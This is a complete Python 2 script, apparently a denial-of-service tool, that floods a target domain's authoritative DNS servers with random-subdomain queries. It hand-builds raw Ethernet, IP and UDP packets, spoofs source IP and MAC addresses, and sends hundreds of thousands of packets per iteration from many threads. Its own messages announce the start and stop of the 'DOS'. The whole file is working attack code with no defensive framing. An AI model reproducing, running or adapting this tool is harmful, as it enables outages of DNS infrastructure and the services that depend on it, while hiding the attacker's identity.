#!/usr/bin/python

import socket
import struct
import sys
import random
import string
import netifaces
import ipaddress
import datetime
import os
import argparse
import array
import platform

from tabulate import tabulate
from scapy.all import srp, Ether, ARP, conf
from tm import ThreadManager

# region Global variables

SOCK = None
PACKETS = []
NUMBER_OF_PACKETS = 0
NAMES = []

# endregion

# region Base functions

def random_name(length):
    return ''.join(random.choice(string.lowercase) for i in range(length))


def random_mac():
    mac = ""
    for _ in range(0, 6, 1):
        mac += format(random.randint(0, 255), 'x') + ":"
    mac = mac[:-1]
    return str(mac)


def ip_checksum(pkt):
    if len(pkt) % 2 == 1:
        pkt += "\0"
    s = sum(array.array("H", pkt))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    s = ~s
    return (((s >> 8) & 0xff) | s << 8) & 0xffff

def make_ethernet_header(srcmac, dstmac):
    srcmac_list = srcmac.split(":")
    dstmac_list = dstmac.split(":")
    net_type = 2048     # Type: IP
    result = ""
    for part_of_dstmac in dstmac_list:
        result += struct.pack("!" "B", int(part_of_dstmac, 16))
    for part_of_srcmac in srcmac_list:
        result += struct.pack("!" "B", int(part_of_srcmac, 16))
    result += struct.pack("!" "H", net_type)
    # Print result ethernet header
    # print ":".join("{:02x}".format(ord(c)) for c in result)
    return result


def make_ipv4_header(srcip, dstip, datal):
    srcip = socket.inet_aton(srcip)
    dstip = socket.inet_aton(dstip)
    ver = 4
    ihl = 5
    dscp_ecn = 0
    tlen = datal + 28
    ident = socket.htons(random.randint(1, 65535))
    flg_frgoff = 0
    ttl = 64
    ptcl = 17
    chksm = 0
    ip_header = struct.pack("!" "2B" "3H" "2B" "H" "4s" "4s",
                            (ver << 4) + ihl, dscp_ecn, tlen, ident,
                            flg_frgoff, ttl, ptcl, chksm, srcip, dstip)
    chksm = ip_checksum(ip_header)
    return struct.pack("!" "2B" "3H" "2B" "H" "4s" "4s",
                       (ver << 4) + ihl, dscp_ecn, tlen, ident,
                       flg_frgoff, ttl, ptcl, chksm, srcip, dstip)


def make_udp_header(srcport, dstport, datal):
    # Don't calculate checksum in UDP header
    return struct.pack("!4H", srcport, dstport, datal + 8, 0)


def make_dns_name(name):
    name_list = name.split(".")
    result_name = ""
    for part_of_name in name_list:
        if len(part_of_name) > 256:
            print "Len of subdomain: " + part_of_name + " more than 256"
            sys.exit(1)
        else:
            result_name += struct.pack("!" "B" "%ds" % (len(part_of_name)), len(part_of_name), part_of_name)
    result_name += "\x00"
    return result_name


def make_dns_a_query(tid, name):
    flags = 256
    questions = 1
    answer_rrs = 0
    authority_rrs = 0
    additional_rrs = 0
    request_type = 1
    request_class = 1
    prefix = struct.pack("!6H", tid, flags, questions, answer_rrs, authority_rrs, additional_rrs)
    suffix = struct.pack("!2H", request_type, request_class)
    return prefix + name + suffix


def make_a_dns_packet(src, dst, tid, name):
    name = make_dns_name(name)
    data = make_dns_a_query(tid, name)
    datal = len(data)
    ethernet_header = make_ethernet_header(src[2], dst[2])
    ip_header = make_ipv4_header(src[0], dst[0], datal)
    udp_header = make_udp_header(src[1], dst[1], datal)
    return ethernet_header + ip_header + udp_header + data


def send_dns_query():
    for index in range(0, NUMBER_OF_PACKETS, 1):
        SOCK.send(PACKETS[index])


def get_mac(iface, ip):

    gw_ip = ""
    gws = netifaces.gateways()

    for gw in gws.keys():
        try:
            if str(gws[gw][netifaces.AF_INET][1]) == iface:
                gw_ip = str(gws[gw][netifaces.AF_INET][0])
        except IndexError:
            if str(gws[gw][0][1]) == iface:
                gw_ip = str(gws[gw][0][0])

    try:
        alive, dead = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), iface=iface, timeout=10, verbose=0)
        return str(alive[0][1].hwsrc)
    except IndexError:
        print " This IP: " + ip + " not on your subnet."
        print " Dst MAC address is MAC address your gateway on interface: " + iface + "."
        try:
            alive, dead = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw_ip), iface=iface, timeout=10, verbose=0)
            return str(alive[0][1].hwsrc)
        except:
            print "Fail to get MAC address for gateway IP: " + gw_ip
            sys.exit(1)
    except:
        print "Fail to get MAC address for IP: " + ip
        sys.exit(1)

# endregion


if __name__ == "__main__":

    if platform.system() != "Linux":
        print "This script can run only in Linux platform!"
        sys.exit(1)

    if os.getuid() != 0:
        print "Only root can run this script!"
        sys.exit(1)

    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('-h', '--help', help='Print help', action='store_true')
    parser.add_argument('-m', '--notspoofmac', help='Don\'t spoof MAC address', action='store_true')
    parser.add_argument('-i', '--notspoofip', help='Don\'t spoof IP address', action='store_true')
    parser.add_argument('-r', '--realname', help='Resolving real domain name', action='store_true')
    parser.add_argument('-t', '--threads', help='Number of threads (default: 100)', default=100)
    parser.add_argument('-p', '--packets', help='Number of packets in one iteration (default: 500000)', default=500000)
    parser.add_argument('-I', '--iterations', help='Number of iterations (default: 1000000)', default=1000000)
    parser.add_argument('-d', '--domain', help='Target domain name (example: test.com)', default="test.com")
    parser.add_argument('-s', '--nsservers', help='NS servers (example: "ns1,ns2")', default="ns1,ns2")
    parser.add_argument('-N', '--netspoofed', help='Network for IP spoofing (example: "192.168.0.0/24")', default=None)
    parser.add_argument('-P', '--dstport', help='Set destination port (default: 53)', default=53)
    parser.add_argument('-l', '--pathtodomainlist', help='Set path to file with domain list', default=None)
    args = parser.parse_args()

    if args.help:
        parser.print_help()
        sys.exit(1)

    if len(sys.argv) <= 2:
        parser.print_help()
        sys.exit(1)

    if args.realname:
        print "Create real DNS name list..."
        for i in range(1, 7, 1):
            domain_list_file_name = "domains/domain_list_" + str(i) + ".txt"
            with open(domain_list_file_name, "r") as domain_list:
                for domain_name in domain_list:
                    NAMES.append(domain_name[:-1])
        print " List of real domains len: " + str(len(NAMES))

    if args.pathtodomainlist is not None:
        print "Create your DNS name list..."
        with open(args.pathtodomainlist, "r") as domain_list:
            for domain_name in domain_list:
                NAMES.append(domain_name[:-1])
        print " List of domains len: " + str(len(NAMES))
        print " List of domains created: " + NAMES[0] + " ... " + NAMES[len(NAMES) - 1]

    netiface_index = 1
    current_netifaces = netifaces.interfaces()

    print "Your interface list:"
    for netiface in current_netifaces:
        print " " + str(netiface_index) + ") " + netiface
        netiface_index += 1

    netiface_index -= 1
    current_netiface_index = raw_input('Set network interface for DOS (1-' + str(netiface_index) + '): ')

    if not current_netiface_index.isdigit():
        print "Your input data is not digit!"
        sys.exit(1)

    if any([int(current_netiface_index) < 1, int(current_netiface_index) > netiface_index]):
        print "Your number is not within range (1-" + str(netiface_index) + ")"
        sys.exit(1)

    try:
        current_network_interface = str(current_netifaces[int(current_netiface_index) - 1])
        current_netsettings = netifaces.ifaddresses(current_network_interface)[netifaces.AF_INET][0]
        current_ip = str(current_netsettings["addr"])
        current_mask = str(current_netsettings["netmask"])
        current_mac_address = str(netifaces.ifaddresses(current_network_interface)[netifaces.AF_LINK][0]['addr'])
    except:
        print "This network interface is not settings for IPv4"
        sys.exit(1)

    current_interface = ipaddress.IPv4Interface(unicode(current_ip + "/" + current_mask))

    print ""
    print tabulate([
        ["Interface", current_network_interface],
        ["IP", current_ip],
        ["Mask", current_mask],
        ["Network", str(current_interface.network)],
        ["Mac", current_mac_address]
    ], tablefmt='grid')
    print ""

    if args.netspoofed is None:
        current_network = ipaddress.ip_network(current_interface.network)
        all_hosts = list(current_network.hosts())
        all_hosts.pop(0)
        all_hosts.pop(len(all_hosts) - 1)
    else:
        spoofed_network = ipaddress.ip_network(unicode(str(args.netspoofed)))
        all_hosts = list(spoofed_network.hosts())

    print "Spoofing IP: " + str(all_hosts[0]) + " ... " + str(all_hosts[len(all_hosts) - 1])

    print "Resolving DNS Servers..."

    DOMAIN = args.domain
    if not DOMAIN.startswith("."):
        DOMAIN = "." + DOMAIN

    NAME_ns_str = str(args.nsservers).replace(" ", "")  # remove all spaces
    NAME_ns_list = NAME_ns_str.split(",")               # make list for ns server names
    NS_list = {}

    PORT = int(args.dstport)

    for NAME in NAME_ns_list:
        NAME += DOMAIN
        NS_list[NAME] = {}
        NS_list[NAME]["NAME"] = NAME
        try:
            NS_list[NAME]["IP"] = str(socket.gethostbyname(NAME))
        except:
            print "Fail to resolving DNS Servers: " + NAME
            sys.exit(1)
        NS_list[NAME]["MAC"] = get_mac(current_network_interface, NS_list[NAME]["IP"])
        NS_list[NAME]["PORT"] = PORT

    print ""
    for NS in NS_list.keys():
        print tabulate([
            ["Name", NS_list[NS]["NAME"]],
            ["IP", NS_list[NS]["IP"]],
            ["MAC", NS_list[NS]["MAC"]],
            ["PORT", NS_list[NS]["PORT"]]
        ], tablefmt='grid')
    print ""

    count = 0
    count_max = int(args.packets)

    min_number_domains = 2
    max_number_domains = 5

    min_len_domain = 2
    max_len_domain = 5

    index_percent = 0
    count_percent = 0

    print "Creating packets..."

    if args.notspoofip:
        print " Your IP is not spoofed!"

    if args.notspoofmac:
        print " Your MAC address is not spoofed!"

    while count < count_max:

        for NS in NS_list.keys():

            DST = (
                str(NS_list[NS]["IP"]),
                int(NS_list[NS]["PORT"]),
                str(NS_list[NS]["MAC"])
            )

            SRC_PORT = random.randint(2049, 65535)

            if args.notspoofip:
                SRC_IP = current_ip
            else:
                SRC_IP = str(random.choice(all_hosts))

            if args.notspoofmac:
                SRC_MAC = current_mac_address
            else:
                SRC_MAC = random_mac()

            SRC = (SRC_IP, SRC_PORT, SRC_MAC)
            TID = random.randint(1, 65535)

            if args.realname:
                NAME = random.choice(NAMES)
            elif args.pathtodomainlist is not None:
                NAME = random.choice(NAMES)
            else:
                NAME = ""
                NAME_NUM = random.randint(min_number_domains, max_number_domains)
                NAME_INDEX = 1

                while NAME_INDEX <= NAME_NUM:
                    NAME += random_name(random.randint(min_len_domain, max_len_domain)) + "."
                    NAME_INDEX += 1
                NAME = NAME[:-1]
                NAME += DOMAIN

            PACKET = make_a_dns_packet(SRC, DST, TID, NAME)
            PACKETS.append(PACKET)

        count += 1

        if count > count_percent:
            sys.stdout.flush()
            sys.stdout.write(" Complete: " + str(index_percent + 1) + "%        \r")
            index_percent += 1
            count_percent = (count_max / 100) * index_percent

    NUMBER_OF_PACKETS = len(PACKETS)
    print "\r\nNumber of packets: " + str(NUMBER_OF_PACKETS)

    SOCK = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    SOCK.bind((current_network_interface, 0))

    try:
        print "Make threads..."
        tm = ThreadManager(int(args.threads))
        print "Start DOS: " + str(datetime.datetime.now().strftime("%Y/%m/%d %H:%M:%S"))
        for _ in range(int(args.iterations)):
            tm.add_task(send_dns_query)

    except:
        SOCK.close()
        print "\r\nStop DOS: " + str(datetime.datetime.now().strftime("%Y/%m/%d %H:%M:%S") + "\r\n")
        null_stream = open(os.devnull, 'w')
        sys.stderr = null_stream

    SOCK.close()
